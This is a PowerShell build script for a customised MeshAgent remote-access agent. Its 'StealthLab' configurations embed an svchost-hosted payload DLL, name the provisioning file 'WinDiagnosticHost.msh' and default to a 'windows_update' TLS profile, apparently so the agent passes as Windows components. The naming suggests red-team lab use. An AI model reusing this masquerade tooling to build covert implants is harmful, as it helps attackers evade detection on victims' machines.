#Requires -Version 5.1
<#
.SYNOPSIS
    Build custom MeshAgent binaries with branding and svchost payload support.

.DESCRIPTION
    This script drives the Windows build for MeshAgent. It generates the branding
    header/.msh provisioning data, stages the svchost payload, compiles the requested
    configuration, and performs a few post-build sanity checks.

.PARAMETER Configuration
    Build configuration (Release, Debug, StealthLab, StealthLab_DLL). Default: Release.

.PARAMETER SkipClean
    Skip removal of previous build artefacts.

.PARAMETER SkipTests
    Skip the lightweight verification checks at the end of the build.

.PARAMETER StealthLab
    Convenience switch that maps Release -> StealthLab and sets STEALTH_LAB=1.

.PARAMETER BuildSvchostDll
    After the main build completes, rebuild the StealthLab_DLL configuration as well.
#>

[CmdletBinding()]
param(
    [Parameter()]
    [ValidateSet('Release', 'Debug', 'StealthLab', 'StealthLab_DLL')]
    [string]$Configuration = 'Release',

    [Parameter()]
    [switch]$SkipClean,

    [Parameter()]
    [switch]$SkipTests,

    [Parameter()]
    [switch]$StealthLab,

    [Parameter()]
    [switch]$BuildSvchostDll
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

function Write-Section {
    param([string]$Title)
    Write-Host ""
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host ("{0}" -f $Title) -ForegroundColor Cyan
    Write-Host "==================================================" -ForegroundColor Cyan
}

function Write-Info { param([string]$Message) Write-Host ("[INFO] {0}" -f $Message) -ForegroundColor Gray }
function Write-Warn { param([string]$Message) Write-Host ("[WARN] {0}" -f $Message) -ForegroundColor Yellow }
function Write-Ok   { param([string]$Message) Write-Host ("[ OK ] {0}" -f $Message) -ForegroundColor Green }
function Write-Err  { param([string]$Message) Write-Host ("[ERR ] {0}" -f $Message) -ForegroundColor Red }

function Stage-SvchostPayload {
    param(
        [Parameter(Mandatory = $true)]
        [string]$RepoRoot,

        [switch]$Quiet
    )

    $payloadDir = Join-Path $RepoRoot "meshservice\embedded"
    if (-not (Test-Path $payloadDir)) {
        New-Item -Path $payloadDir -ItemType Directory -Force | Out-Null
    }

    $candidateDirs = @(
        (Join-Path $RepoRoot "meshservice\x64\StealthLab_DLL"),
        (Join-Path $RepoRoot "meshservice\StealthLab_DLL")
    )

    $candidates = @()
    foreach ($dir in $candidateDirs) {
        if (Test-Path $dir) {
            $candidates += Get-ChildItem -Path $dir -Filter *.dll -ErrorAction SilentlyContinue
        }
    }

    if (-not $candidates) {
        if (-not $Quiet) { Write-Warn "No svchost DLL found to stage (build StealthLab_DLL first)" }
        return $false
    }

    $latest = $candidates | Sort-Object LastWriteTime -Descending | Select-Object -First 1
    $payloadPath = Join-Path $payloadDir "svchost_payload.dll"
    Copy-Item -Path $latest.FullName -Destination $payloadPath -Force

    $hashSummary = "n/a"
    try {
        $hash = (Get-FileHash -Path $payloadPath -Algorithm SHA256).Hash
        if ($hash) { $hashSummary = $hash.Substring(0, [Math]::Min(8, $hash.Length)) }
    } catch { }

    if (-not $Quiet) {
        Write-Info ("Staged svchost payload: {0} -> embedded\svchost_payload.dll (SHA256 {1}...)" -f $latest.Name, $hashSummary)
    }
    return $true
}

function Get-OutputPath {
    param(
        [Parameter(Mandatory = $true)] [string]$RepoRoot,
        [Parameter(Mandatory = $true)] [string]$Configuration,
        [Parameter(Mandatory = $true)] [ValidateSet('x64','Win32')] [string]$Platform
    )

    $map = @{
        'Release'        = @{ 'x64' = 'meshservice\Release\MeshService64.exe'; 'Win32' = 'meshservice\Release\MeshService.exe' }
        'Release_NoOpenSSL' = @{ 'x64' = 'meshservice\Release_NoOpenSSL\MeshService64.exe'; 'Win32' = 'meshservice\Release_NoOpenSSL\MeshService.exe' }
        'Debug'          = @{ 'x64' = 'meshservice\Debug\MeshService64.exe'; 'Win32' = 'meshservice\Debug\MeshService.exe' }
        'Debug_NoOpenSSL'= @{ 'x64' = 'meshservice\Debug_NoOpenSSL\MeshService64.exe'; 'Win32' = 'meshservice\Debug_NoOpenSSL\MeshService.exe' }
        'StealthLab'     = @{ 'x64' = 'meshservice\x64\StealthLab\MeshService-2022.exe'; 'Win32' = 'meshservice\StealthLab\MeshService-2022.exe' }
        'StealthLab_DLL' = @{ 'x64' = 'meshservice\x64\StealthLab_DLL\MeshService-2022.dll' }
        'Release_DLL'    = @{ 'x64' = 'meshservice\x64\Release_DLL\MeshService-2022.dll' }
        'Debug_DLL'      = @{ 'x64' = 'meshservice\x64\Debug_DLL\MeshService-2022.dll' }
    }

    if ($map.ContainsKey($Configuration) -and $map[$Configuration].ContainsKey($Platform)) {
        $relative = $map[$Configuration][$Platform]
        if ($relative) {
            return Join-Path $RepoRoot $relative
        }
    }

    if ($Platform -eq 'x64') {
        return Join-Path $RepoRoot 'meshservice\Release\MeshService64.exe'
    }

    return Join-Path $RepoRoot 'meshservice\Release\MeshService.exe'
}

$RepoRoot        = $PSScriptRoot
$BrandingConfig  = Join-Path $RepoRoot "branding_config.json"
$BrandingHeader  = Join-Path $RepoRoot "meshcore\generated\meshagent_branding.h"
$ProvisioningMsh = Join-Path $RepoRoot "WinDiagnosticHost.msh"
$MSBuildPath     = "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
$SolutionFile    = Join-Path $RepoRoot "MeshAgent-2022.sln"
$ProjectFile     = Join-Path $RepoRoot "meshservice\MeshService-2022.vcxproj"
$NetworkProfileScript = Join-Path $RepoRoot "tools\generate_network_profile.py"
$EmbedProvisioningScript = Join-Path $RepoRoot "tools\embed_provisioning_simple.ps1"

if ($StealthLab) {
    $env:STEALTH_LAB = '1'
    if ($Configuration -eq 'Release') { $Configuration = 'StealthLab' }
}

Write-Section ("MeshAgent Build - {0}" -f $Configuration)

$OutputX64 = Get-OutputPath -RepoRoot $RepoRoot -Configuration $Configuration -Platform 'x64'
$OutputX86 = Get-OutputPath -RepoRoot $RepoRoot -Configuration $Configuration -Platform 'Win32'

# Step 1: Validate environment
Write-Section "[1/7] Environment validation"

if (-not (Test-Path $MSBuildPath)) { throw "MSBuild not found at '$MSBuildPath'. Install Visual Studio 2022 build tools or update the path." }
if (-not (Test-Path $BrandingConfig)) { throw "Branding config not found: $BrandingConfig" }
if (-not (Test-Path $ProjectFile)) { throw "Project file not found: $ProjectFile" }
if (-not (Test-Path $SolutionFile)) { throw "Solution file not found: $SolutionFile" }

try {
    $pythonVersion = python --version 2>&1
    Write-Info ("Python detected: {0}" -f $pythonVersion.Trim())
} catch {
    Write-Warn "Python not found. Network profile generation will be skipped."
    $NetworkProfileScript = $null
}

Write-Ok "Environment looks good"

# Step 2: Generate branding header and provisioning .msh
Write-Section "[2/7] Generating branding artifacts"

if (-not (Test-Path $EmbedProvisioningScript)) {
    throw "Provisioning embed script missing: $EmbedProvisioningScript"
}

$embedArgs = @(
    '-NoProfile',
    '-ExecutionPolicy','Bypass',
    '-File', $EmbedProvisioningScript,
    '-ConfigPath', $BrandingConfig,
    '-OutputHeader', $BrandingHeader,
    '-OutputMsh', $ProvisioningMsh
)
& powershell.exe $embedArgs
if ($LASTEXITCODE -ne 0) { throw "embed_provisioning_simple.ps1 failed with exit code $LASTEXITCODE" }

Write-Ok "Branding header and provisioning data refreshed"

# Step 3: Generate network profile (optional)
Write-Section "[3/7] Generating network profile"

if ($NetworkProfileScript -and (Test-Path $NetworkProfileScript)) {
    try {
        $profileArgs = @(
            $NetworkProfileScript,
            "--config", $BrandingConfig,
            "--tls-profile", ($env:TLS_PROFILE ?? "windows_update"),
            "--output-header", (Join-Path $RepoRoot "meshcore\generated\network_profile.h"),
            "--output-json", (Join-Path $RepoRoot "build\meshagent\generated\network_profile.json")
        )
        & python $profileArgs
        if ($LASTEXITCODE -eq 0) {
            Write-Ok "Network profile generated"
        } else {
            Write-Warn ("Network profile generator exited with {0}" -f $LASTEXITCODE)
        }
    } catch {
        Write-Warn ("Network profile generation failed: {0}" -f $_)
    }
} else {
    Write-Info "No network profile script detected; skipping"
}

# Step 4: Clean (optional)
Write-Section "[4/7] Cleaning"

if ($SkipClean) {
    Write-Info "Clean skipped by request"
} else {
    $cleanTargets = @(
        "meshservice\Release",
        "meshservice\Debug",
        "meshservice\StealthLab",
        "meshservice\x64\$Configuration",
        "meshservice\x64\OBJ"
    ) | Where-Object { $_ }

    foreach ($target in $cleanTargets) {
        $fullPath = Join-Path $RepoRoot $target
        if (Test-Path $fullPath) {
            Remove-Item -Path $fullPath -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    Write-Ok "Previous artefacts removed"
}

# Step 5: Stage svchost payload before build so resources embed correctly
Write-Section "[5/7] Staging svchost payload"
$preStage = Stage-SvchostPayload -RepoRoot $RepoRoot
if (-not $preStage) {
    Write-Warn "Continuing without staged payload; StealthLab builds may miss SVCHOSTDLL resource"
}

# Step 6: Build x64
Write-Section "[6/7] Building x64"

$msbuildArgsX64 = @(
    $ProjectFile,
    "/p:Configuration=$Configuration",
    "/p:Platform=x64",
    "/p:WindowsTargetPlatformVersion=10.0",
    "/p:PlatformToolset=v143",
    "/m",
    "/v:minimal",
    "/t:Rebuild"
)
& "$MSBuildPath" $msbuildArgsX64
if ($LASTEXITCODE -ne 0) { throw "MSBuild (x64) failed with exit code $LASTEXITCODE" }

if (-not (Test-Path $OutputX64)) { throw "Expected x64 output not found at $OutputX64" }
$x64Item = Get-Item $OutputX64
Write-Ok ("x64 build complete: {0} ({1:N2} MB)" -f $x64Item.Name, ($x64Item.Length / 1MB))

# Refresh staged payload with newly built DLLs (if any)
Stage-SvchostPayload -RepoRoot $RepoRoot -Quiet | Out-Null

# Step 7: Build x86 if configuration produces a Win32 artefact
if ($OutputX86 -and ($Configuration -notmatch '_DLL$')) {
    Write-Section "[7/7] Building Win32"

    $msbuildArgsWin32 = @(
        $ProjectFile,
        "/p:Configuration=$Configuration",
        "/p:Platform=Win32",
        "/p:WindowsTargetPlatformVersion=10.0",
        "/p:PlatformToolset=v143",
        "/m",
        "/v:minimal",
        "/t:Rebuild"
    )
    & "$MSBuildPath" $msbuildArgsWin32
    if ($LASTEXITCODE -ne 0) { throw "MSBuild (Win32) failed with exit code $LASTEXITCODE" }

    if (-not (Test-Path $OutputX86)) { throw "Expected Win32 output not found at $OutputX86" }
    $x86Item = Get-Item $OutputX86
    Write-Ok ("Win32 build complete: {0} ({1:N2} MB)" -f $x86Item.Name, ($x86Item.Length / 1MB))
} else {
    Write-Section "[7/7] Building Win32"
    Write-Info "No Win32 artefact expected for configuration '$Configuration'; skipping"
    $x86Item = $null
}

# Verification
Write-Section "Verification"

$hashX64 = (Get-FileHash -Path $OutputX64 -Algorithm MD5).Hash
Write-Info ("x64 MD5 : {0}" -f $hashX64)
if ($x86Item) {
    $hashX86 = (Get-FileHash -Path $x86Item.FullName -Algorithm MD5).Hash
    Write-Info ("x86 MD5 : {0}" -f $hashX86)
}

if (-not $SkipTests) {
    if ($x64Item.Length -lt 3MB) {
        Write-Warn "x64 binary smaller than 3 MB; embedded resources may be missing"
    }
    try {
        $peHeader = Get-Content -Path $OutputX64 -Encoding Byte -TotalCount 2
        if ($peHeader[0] -eq 0x4D -and $peHeader[1] -eq 0x5A) {
            Write-Ok "x64 binary has valid PE header"
        } else {
            Write-Warn "x64 binary failed PE signature check"
        }
    } catch {
        Write-Warn ("Unable to validate PE header: {0}" -f $_)
    }
}

Write-Section "Build summary"
Write-Host ("Configuration : {0}" -f $Configuration) -ForegroundColor Cyan
Write-Host ("x64 Output   : {0}" -f $OutputX64) -ForegroundColor Cyan
if ($x86Item) { Write-Host ("Win32 Output : {0}" -f $OutputX86) -ForegroundColor Cyan }
Write-Host ("Provisioning : {0}" -f $ProvisioningMsh) -ForegroundColor Cyan
Write-Host ""

if ($BuildSvchostDll) {
    Write-Section "Extra: Building StealthLab_DLL"
    $dllArgs = @(
        $ProjectFile,
        "/p:Configuration=StealthLab_DLL",
        "/p:Platform=x64",
        "/p:WindowsTargetPlatformVersion=10.0",
        "/p:PlatformToolset=v143",
        "/m",
        "/v:minimal",
        "/t:Rebuild"
    )
    & "$MSBuildPath" $dllArgs
    if ($LASTEXITCODE -ne 0) { throw "MSBuild (StealthLab_DLL) failed with exit code $LASTEXITCODE" }
    Stage-SvchostPayload -RepoRoot $RepoRoot | Out-Null
    Write-Ok "StealthLab_DLL build complete and payload restaged"
}

Write-Section "Next steps"
Write-Info "1. Review artefacts under meshservice\\..."
Write-Info "2. Package with build_complete.ps1 or tools\\prepare_meshcentral_agent.ps1 as needed"
Write-Info "3. Run manual svchost audit: .\\audit_and_debug_svchost.ps1"
Write-Host ""

